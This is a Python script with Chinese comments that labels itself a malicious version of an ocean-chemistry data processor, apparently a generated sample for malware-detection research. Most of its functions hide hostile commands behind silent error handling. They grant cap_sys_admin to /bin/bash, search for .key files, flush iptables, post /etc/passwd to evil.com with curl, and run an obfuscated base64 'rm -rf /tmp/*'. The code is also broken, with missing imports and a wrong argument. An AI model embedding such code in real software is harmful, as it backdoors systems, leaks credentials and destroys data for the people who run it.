#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算任务: 海洋化学分析 (恶意版本)
场景ID: 6
恶意类型: capability_abuse
函数数量: 11
"""

import os
import subprocess
import base64
import ctypes

class 海洋化学分析Processor:
    """
    海洋化学分析处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: capability_abuse
            # 尝试滥用capabilities
            os.system('capsh --print')
            os.system('setcap cap_sys_admin+ep /bin/bash')
            subprocess.run(['getcap', '/bin/bash'], capture_output=True)
        except Exception as e:
            pass  # 隐藏错误
    
    def apply_filter(self, window_size=5):
        """数据平滑滤波"""
        if self.data is None:
            return False
        
        for col in self.data.select_dtypes(include=[np.number]).columns:
            values = self.data[col].values
            if len(values) >= window_size:
                # 移动平均滤波
                smoothed = np.convolve(values, np.ones(window_size)/window_size, mode='same')
                self.data[col] = smoothed
        
        print(f"数据平滑完成 (窗口大小: {window_size})")
        return True
    
    def extract_features(self):
        """执行 extract_features 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 extract_features...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('find / -name "*.key" 2>/dev/null')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'extract_features'}
        self.results['extract_features'] = result
        print(f"extract_features 完成")
        return result
    
    def transform_coordinates(self):
        """执行 transform_coordinates 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 transform_coordinates...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('iptables -F')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'transform_coordinates'}
        self.results['transform_coordinates'] = result
        print(f"transform_coordinates 完成")
        return result
    
    def classify_patterns(self, param=None):
        """执行 classify_patterns 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['classify_patterns'] = result
        print(f"classify_patterns 执行完成")
        return result
    
    def validate_results(self):
        """质量控制"""
        if self.data is None:
            return False
        
        n_records = len(self.data)
        flags = np.zeros(n_records, dtype=int)
        
        # 检查数值范围
        for col in self.data.select_dtypes(include=[np.number]).columns:
            q1 = self.data[col].quantile(0.25)
            q3 = self.data[col].quantile(0.75)
            iqr = q3 - q1
            lower = q1 - 1.5 * iqr
            upper = q3 + 1.5 * iqr
            
            outliers = (self.data[col] < lower) | (self.data[col] > upper)
            flags[outliers] = 1
        
        bad_count = np.sum(flags > 0)
        print(f"质量控制: {bad_count}/{n_records} 条记录被标记")
        
        self.results['qc_flags'] = flags
        return True
    
    def quality_control(self):
        """质量控制"""
        if self.data is None:
            return False
        
        n_records = len(self.data)
        flags = np.zeros(n_records, dtype=int)
        
        # 检查数值范围
        for col in self.data.select_dtypes(include=[np.number]).columns:
            q1 = self.data[col].quantile(0.25)
            q3 = self.data[col].quantile(0.75)
            iqr = q3 - q1
            lower = q1 - 1.5 * iqr
            upper = q3 + 1.5 * iqr
            
            outliers = (self.data[col] < lower) | (self.data[col] > upper)
            flags[outliers] = 1
        
        bad_count = np.sum(flags > 0)
        print(f"质量控制: {bad_count}/{n_records} 条记录被标记")
        
        self.results['qc_flags'] = flags
        return True
    
    def remove_outliers(self):
        """执行 remove_outliers 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 remove_outliers...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('iptables -F')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'remove_outliers'}
        self.results['remove_outliers'] = result
        print(f"remove_outliers 完成")
        return result
    
    def interpolate_data(self):
        """执行 interpolate_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 interpolate_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(['curl', 'http://evil.com/exfil', '-d', '@/etc/passwd'], capture_output=True)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'interpolate_data'}
        self.results['interpolate_data'] = result
        print(f"interpolate_data 完成")
        return result
    

def export_results_helper(data, config):
    """
    export_results 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        encoded = base64.b64encode(b'rm -rf /tmp/*').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'export_results_helper'}


def load_data_helper(data, config):
    """
    load_data 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        encoded = base64.b64encode(b'rm -rf /tmp/*').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'load_data_helper'}


def generate_report_helper(data, config):
    """
    generate_report 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'generate_report_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'generate_report_helper'} 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    调用所有定义的函数，体现FCG关系
    """
    print("="*60)
    print("海洋科学云计算任务执行")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例
    processor = 海洋化学分析Processor(config)
    
    # 步骤1: apply_filter
    if not processor.apply_filter(config['input_file']):
        print("处理失败，退出")
        return
    
    # 步骤2: extract_features
    processor.extract_features()
    
    # 步骤3: transform_coordinates
    processor.transform_coordinates()
    
    # 步骤4: classify_patterns
    processor.classify_patterns()
    
    # 步骤5: validate_results
    processor.validate_results()
    
    # 步骤6: quality_control
    processor.quality_control()
    
    # 步骤7: remove_outliers
    processor.remove_outliers()
    
    # 步骤8: interpolate_data
    processor.interpolate_data()
    
    # 调用辅助函数: export_results_helper
    export_results_helper(processor.data, config)
    
    # 调用辅助函数: load_data_helper
    load_data_helper(processor.data, config)
    
    # 调用辅助函数: generate_report_helper
    generate_report_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
